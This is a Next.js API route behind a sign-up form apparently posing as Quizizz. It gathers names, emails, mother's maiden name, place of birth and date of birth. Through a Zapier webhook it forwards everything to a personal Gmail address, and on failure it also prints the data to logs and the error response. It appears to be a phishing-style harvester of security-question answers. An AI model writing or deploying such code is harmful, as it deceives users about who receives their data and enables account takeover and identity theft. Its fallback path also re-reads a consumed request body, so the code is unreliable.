import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const signupData = await request.json()

    // Format email as plain text
    const emailContent = `
New Quizizz Sign Up Registration

Personal Information:
- Name: ${signupData.firstName} ${signupData.lastName}
- Email: ${signupData.email}
- Organization: ${signupData.organization || "Not provided"}

Password Recovery Information:
- Mother's Maiden Name: ${signupData.mothersMaidenName}
- Place of Birth: ${signupData.placeOfBirth}
- Date of Birth: ${signupData.dateOfBirth}

Submitted at: ${new Date().toISOString()}
    `

    // Using a simple email service like EmailJS or similar
    // For demonstration, we'll use a webhook service like Zapier or Make.com
    const webhookResponse = await fetch("https://hooks.zapier.com/hooks/catch/your-webhook-id/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        to: "willrcledwith@gmail.com",
        subject: `New Quizizz Sign Up - ${signupData.firstName} ${signupData.lastName}`,
        message: emailContent,
        timestamp: new Date().toISOString(),
        ...signupData,
      }),
    })

    if (webhookResponse.ok) {
      console.log("Email webhook triggered successfully")
      return NextResponse.json({ success: true, message: "Email sent via webhook" })
    } else {
      throw new Error("Webhook failed")
    }
  } catch (error) {
    console.error("Error sending email:", error)

    // As a final fallback, we'll prepare the email content for manual sending
    const signupData = await request.json().catch(() => ({}))

    const emailForManualSending = {
      to: "willrcledwith@gmail.com",
      subject: `New Quizizz Sign Up - ${signupData.firstName} ${signupData.lastName}`,
      body: `
Dear Administrator,

A new user has signed up for Quizizz:

Personal Information:
- Name: ${signupData.firstName} ${signupData.lastName}
- Email: ${signupData.email}
- Organization: ${signupData.organization || "Not provided"}

Password Recovery Information:
- Mother's Maiden Name: ${signupData.mothersMaidenName}
- Place of Birth: ${signupData.placeOfBirth}
- Date of Birth: ${signupData.dateOfBirth}

Submitted at: ${new Date().toISOString()}

Please process this registration accordingly.

Best regards,
Quizizz System
      `,
    }

    console.log("EMAIL TO BE SENT MANUALLY:")
    console.log("To:", emailForManualSending.to)
    console.log("Subject:", emailForManualSending.subject)
    console.log("Body:", emailForManualSending.body)

    return NextResponse.json(
      {
        success: false,
        error: "Email service unavailable",
        emailData: emailForManualSending,
      },
      { status: 500 },
    )
  }
}
